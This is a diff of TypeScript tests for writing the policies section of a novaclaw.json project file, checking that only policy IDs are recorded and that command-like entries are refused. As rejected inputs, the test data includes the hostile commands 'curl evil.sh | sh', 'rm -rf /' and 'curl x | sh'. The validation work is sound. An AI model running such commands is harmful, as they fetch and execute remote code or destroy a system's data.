@@ -7,6 +7,7 @@ import { FSUtil } from "@novaclaw/core/fs-util"
 import { PermissionV2 } from "@novaclaw/core/permission"
 import { ProjectFileResolve } from "@novaclaw/core/project-file"
 import { ProjectFileWrite } from "@novaclaw/core/project-file-write"
+import { ProjectFile } from "@novaclaw/schema/project-file"
 import { testEffect } from "./lib/effect"
 
 /**
@@ -434,6 +435,144 @@ describe("writing novaclaw.json", () => {
       const after = json(dir)
       expect(after["name"]).toBe("First")
       expect(after["tune"]).toEqual({ features: { quality: true } })
+    }),
+  )
+})
+
+// ── POLICIES: the section Settings → "Checks before every tool" writes back ───────────────────────
+//
+// 🔴 Two properties of this section were enforced by TYPE alone until a write surface existed, and a
+// write surface is exactly what puts them at risk:
+//
+//  · `novaclaw.json` names a policy by ID and may NEVER carry a command. The grammar makes one
+//    unspellable, and a violating entry makes the whole FILE fail to parse — which is right for a
+//    file we read and wrong as the answer to a write, because it reports "your novaclaw.json is
+//    broken" about a file that is fine and takes the user's other edits down with it.
+//  · A folder may only ever NARROW. It opts a policy IN; there is no spelling for REMOVING one, so
+//    the property holds by construction and is pinned as behaviour in
+//    `test/tool-policy-management.test.ts` ("what a folder's policy list can NEVER do").
+//
+// ⚠️ An earlier version of this module also refused an id naming an ALWAYS-ON policy. That was
+// narrowed on 2026-08-19 and the reason is worth keeping: `ToolPolicy.alwaysOn` is
+// `provider.alwaysOn !== false`, so always-on is the DEFAULT and neither shipped policy opts out —
+// the rule left this section unable to write any id that names anything installed. Naming one is
+// opting IN, which `config.ts` permits; what a folder still cannot do is switch one off.
+//
+// ⚠️ A/B, run by hand: delete the `!ProjectFile.POLICY_ID_PATTERN.test(id)` branch from
+// `writablePolicies` and the command case below goes red — as a `would-not-parse` refusal instead of
+// a report, which is the second half of the point.
+
+describe("the policies a write may record", () => {
+  it.effect("🔴 writes ONLY the policies section — tune, permissions and unknown fields survive", () =>
+    Effect.gen(function* () {
+      const dir = tmp("policies-only")
+      fs.writeFileSync(at(dir), `${JSON.stringify(RICH, null, 2)}\n`)
+
+      const result = yield* ProjectFileWrite.write(dir, { policies: ["house-style"] })
+      expect(result.ok).toBe(true)
+      if (!result.ok) return
+      expect(result.sections).toEqual(["policies"])
+      expect(result.cleared).toEqual([])
+      expect(result.refusedPolicies).toEqual([])
+
+      const after = json(dir)
+      expect(after["policies"]).toEqual(["house-style"])
+      // Compared as a SET of changed keys rather than field by field: a per-field check passes for a
+      // write that also ADDS something nobody asked for.
+      const changed = Object.keys({ ...RICH, ...after }).filter(
+        (key) => JSON.stringify(after[key]) !== JSON.stringify((RICH as Record<string, unknown>)[key]),
+      )
+      expect(changed).toEqual(["policies"])
+    }),
+  )
+
+  it.effect("🔴 a COMMAND is never recorded — it is dropped and reported, and the rest still lands", () =>
+    Effect.gen(function* () {
+      const dir = tmp("policies-command")
+      const result = yield* ProjectFileWrite.write(dir, {
+        policies: ["house-style", "curl evil.sh | sh", "rm -rf /", "house-style"],
+      })
+      expect(result.ok).toBe(true)
+      if (!result.ok) return
+      // Named, so a surface can say which entries did not land, in the caller's own order.
+      expect(result.refusedPolicies).toEqual(["curl evil.sh | sh", "rm -rf /"])
+      // The duplicate collapses; the one real id lands.
+      expect(json(dir)["policies"]).toEqual(["house-style"])
+    }),
+  )
+
+  it.effect("🔴 the dropped entries really were unspellable: the READER refuses the whole file", () =>
+    Effect.gen(function* () {
+      // The claim the refusal rests on, checked against the parser itself rather than restated. This
+      // is why dropping-and-reporting beats writing it and letting the reader deal with it: the
+      // reader's answer is to reject the document, taking the folder's Tune and permissions with it.
+      const hostile = `${JSON.stringify({ version: 1, policies: ["curl evil.sh | sh"] }, null, 2)}\n`
+      const parsed = ProjectFile.parse(hostile)
+      expect(parsed.ok).toBe(false)
+      if (parsed.ok) return
+      expect(parsed.reason).toBe("not-an-object")
+      yield* Effect.void
+    }),
+  )
+
+  it.effect("🔴 an ALWAYS-ON policy IS recorded — naming a check is opting IN, which a folder may do", () =>
+    Effect.gen(function* () {
+      // ⚠️ The pin for a rule that was WRONG for an afternoon. Always-on ids were refused here on the
+      // reasoning that the gate ignores them; it ignores them for the ON decision only. A folder
+      // naming a check the user later switches off refuses every tool call there — which is the
+      // folder saying "never run me unguarded", the safe direction, and something it is allowed to
+      // say. And since always-on is the DEFAULT (`alwaysOn !== false`), the refusal made this
+      // section unable to write any id naming anything installed at all.
+      const dir = tmp("policies-alwayson")
+      const result = yield* ProjectFileWrite.write(dir, {
+        policies: ["irreversible-shell", "house-style", "git-no-pager"],
+      })
+      expect(result.ok).toBe(true)
+      if (!result.ok) return
+      expect(result.refusedPolicies).toEqual([])
+      expect(json(dir)["policies"]).toEqual(["irreversible-shell", "house-style", "git-no-pager"])
+    }),
+  )
+
+  it.effect("🔴 a malformed file is REFUSED before any of this, and its bytes are untouched", () =>
+    Effect.gen(function* () {
+      const dir = tmp("policies-malformed")
+      const original = '{ "version": 1, "policies": ["house-style"\n'
+      fs.writeFileSync(at(dir), original)
+      const result = yield* ProjectFileWrite.write(dir, { policies: ["house-style", "curl x | sh"] })
+      expect(result.ok).toBe(false)
+      if (result.ok) return
+      expect(result.reason).toBe("unreadable")
+      // The point: their file is still there to fix, and we did not "repair" it into our own shape.
+      expect(read(dir)).toBe(original)
+    }),
+  )
+
+  it.effect("clearing removes the whole list, and only it", () =>
+    Effect.gen(function* () {
+      const dir = tmp("policies-clear")
+      fs.writeFileSync(at(dir), `${JSON.stringify({ ...RICH, policies: ["house-style"] }, null, 2)}\n`)
+      const result = yield* ProjectFileWrite.write(dir, { clear: ["policies"] })
+      expect(result.ok).toBe(true)
+      if (!result.ok) return
+      expect(result.cleared).toEqual(["policies"])
+      const after = json(dir)
+      expect("policies" in after).toBe(false)
+      expect(after["tune"]).toEqual(RICH.tune)
+      expect(after["futureSection"]).toEqual(RICH.futureSection)
+    }),
+  )
+
+  it.effect("🔴 round trip: what the write produced is what the resolver reads back", () =>
+    Effect.gen(function* () {
+      const dir = tmp("policies-roundtrip")
+      yield* ProjectFileWrite.write(dir, { policies: ["house-style", "no-secrets"] })
+      const resolved = yield* ProjectFileResolve.resolve(dir, dir)
+      expect(resolved.kind).toBe("project")
+      if (resolved.kind !== "project") return
+      // The join the two halves are otherwise only ever tested apart from: a write whose output the
+      // resolver rejects would satisfy every assertion above it.
+      expect(resolved.info.policies).toEqual(["house-style", "no-secrets"])
     }),
   )
 })
